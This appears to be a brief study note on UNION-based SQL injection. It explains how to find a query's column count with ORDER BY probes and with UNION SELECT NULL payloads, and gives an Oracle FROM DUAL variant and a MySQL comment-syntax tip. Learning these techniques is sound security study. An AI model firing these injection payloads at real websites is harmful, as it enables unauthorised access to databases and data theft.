
---
```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query.

To perform a SQL attack, attackers must find out:
	- How many columns are being returned from the original query.
	- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

## Determining the number of columns

There are two ways to determine how many columns in the databas:
If the original SQL is 
	`SELECT name, price FROM products WHERE category = 'Gifts';` 
	
	- `ORDER BY` :  
		inject :' ORDER BY 1-- , the SQL change into 
		SELECT name, price FROM products WHERE category = '' ORDER BY 1--';
		and incrementing the specified column index until an error occurs.
		
	- `UNION SELECT` :
		 inject : ' UNION SELECT NULL --
				 ' UNION SELECT NULL, NULL --
				 ' UNION　SELECT NULL, NULL, NULL --
				 ...
		the SQL change into 
		SELECT name, price FROM products WHERE category = '' UNION SELECT NULL -- 

## Database-specific syntax

On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table.
```
' UNION SELECT NULL FROM DUAL--
```
On MySQL, the double-dash sequence must be followed by a space.

In SQL, if it's a Constant char, '' is necessary.